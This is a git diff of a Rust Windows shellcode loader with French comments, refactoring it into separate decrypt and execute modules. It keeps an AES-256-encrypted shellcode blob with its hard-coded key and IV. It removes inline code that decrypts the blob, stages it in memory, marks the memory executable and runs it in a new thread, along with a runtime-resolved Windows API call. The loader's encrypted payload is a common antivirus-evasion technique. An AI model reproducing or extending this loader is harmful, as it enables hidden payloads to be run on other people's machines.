@@ -1,11 +1,7 @@
-use core::slice;
-use std::{alloc::{Layout, alloc}, mem, ptr};
-use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, VirtualAlloc};
-use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit, KeyInit}; // Ajout important
-use aes::Aes256;
-use cbc::Decryptor;
-
-type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
+// loader/src/main.rs
+mod decrypt;
+mod execute;
+mod native;
 
 // 2. Définition du shellcode chiffré par AES-256-CBC
 static ENCRYPTED_SHELLCODE: &[u8] = &[0xbb,0x72,0xdb,0x3b,0xb2,0x84,0x37,0x2c,0xc6,0xde,0x91,0x67,
@@ -60,119 +56,11 @@ static ENCRYPTION_IV: [u8; 16] = [
     0xe8, 0xf5, 0x3e, 0x0b, 0x76, 0xec, 0x87, 0xc7,
 ];
 
-
-fn decrypt_simple_aes(encrypted: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Result<Vec<u8>, String> {
-    use aes::Aes256;
-    use cbc::Decryptor;
-    use aes::cipher::{block_padding::Pkcs7, KeyIvInit};
-
-    // On copie dans un buffer mutable car l'algo modifie la data
-    let mut buffer = encrypted.to_vec();
-
-    // Crée le déchiffreur avec clé et IV
-    let cipher = Decryptor::<Aes256>::new_from_slices(key, iv)
-        .map_err(|e| format!("Erreur init déchiffreur: {:?}", e))?;
-
-    // Déchiffrement avec padding PKCS7
-    let decrypted_data = cipher
-        .decrypt_padded_mut::<Pkcs7>(&mut buffer)
-        .map_err(|e| format!("Erreur de déchiffrement: {:?}", e))?;
-
-    // Copie les données utiles dans un Vec à retourner
-    Ok(decrypted_data.to_vec())
-}
-
-
-
-
-fn shellcode_loader(shellcode: &[u8]){
-    use windows::Win32::{
-    Foundation::{CloseHandle, GetLastError},
-    System::{
-        Memory::{
-            VirtualAlloc, VirtualFree, VirtualProtect,
-            MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
-            PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_PROTECTION_FLAGS,
-            PAGE_NOACCESS
-        },
-        Threading::{
-            CreateThread, WaitForSingleObject,
-            INFINITE, THREAD_CREATION_FLAGS
-        },
-    },
-};
-
-    unsafe {
-        // Allocation de mémoire avec permissions READWRITE
-        let mem = VirtualAlloc(None, shellcode.len(), MEM_RESERVE, PAGE_NOACCESS);
-
-        if mem.is_null() {
-            panic!("Échec de l'allocation mémoire avec VirtualAlloc");
-        }
-
-        let mem = VirtualAlloc(Some(mem), shellcode.len(), MEM_COMMIT, PAGE_READWRITE);
-
-        println!("Mémoire allouée à l'adresse: {:p}", mem);
-
-        // Copie du shellcode dans la mémoire allouée
-        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
-
-        // Modification des permissions de la mémoire pour exécution
-        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-        let protect_result = VirtualProtect(mem, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
-        
-
-        // Création d'un thread pour exécuter le shellcode
-        let handle = CreateThread(None, 0, Some(std::mem::transmute(mem)), None, THREAD_CREATION_FLAGS(0), None).expect("Échec de CreateThread");
-        
-        WaitForSingleObject(handle, 10000);
-        let _ = CloseHandle(handle);
-        let _ = VirtualFree(mem, 0, MEM_RELEASE);
-    }
-
-}
-
-extern "system" {
-    fn LoadLibraryA(name: *const i8) -> *mut core::ffi::c_void;
-    fn GetProcAddress(module: *mut core::ffi::c_void, proc_name: *const i8) -> *mut core::ffi::c_void;
-}
-
-type MessageBoxAFn = unsafe extern "system" fn(
-    h_wnd: *mut core::ffi::c_void,
-    lp_text: *const i8,
-    lp_caption: *const i8,
-    u_type: u32,
-) -> i32;
-
-fn winapi_call(){
-    use std::ffi::CString;
-    use std::ptr;
-    use std::mem;
-
-    unsafe {
-        let lib_name = CString::new("user32.dll").unwrap();
-        let module = LoadLibraryA(lib_name.as_ptr());
-        assert!(!module.is_null(), "Échec de LoadLibraryA");
-
-        let func_name = CString::new("MessageBoxA").unwrap();
-        let proc_addr = GetProcAddress(module, func_name.as_ptr());
-        assert!(!proc_addr.is_null(), "Échec de GetProcAddress");
-
-        let message_box: MessageBoxAFn = mem::transmute(proc_addr);
-
-        let text = CString::new("Hello from dynamically resolved MessageBoxA!").unwrap();
-        let caption = CString::new("Dynamic Call").unwrap();
-
-        message_box(ptr::null_mut(), text.as_ptr(), caption.as_ptr(), 0);
-    }
-
-}
-
 // 3. Fonction principale
 fn main() -> windows::core::Result<()> {
     println!("=== Début du Shellcode Loader ===");
 
-    let shellcode = match decrypt_simple_aes(ENCRYPTED_SHELLCODE, &ENCRYPTION_KEY, &ENCRYPTION_IV) {
+    let shellcode = match decrypt::decrypt_simple_aes(ENCRYPTED_SHELLCODE, &ENCRYPTION_KEY, &ENCRYPTION_IV) {
         Ok(data) => data,
         Err(e) => {
             println!("Erreur de déchiffrement: {}", e);
@@ -182,7 +70,7 @@ fn main() -> windows::core::Result<()> {
 
     println!("[1] Taille du shellcode: {} bytes", shellcode.len());
     println!("[2] Exécution du shellcode...");
-    shellcode_loader(&shellcode); // PAS de alloc() ici
+    let _ = execute::execute::execute_shellcode(&shellcode); // PAS de alloc() ici
 
     println!("=== Fin ===");
     Ok(())
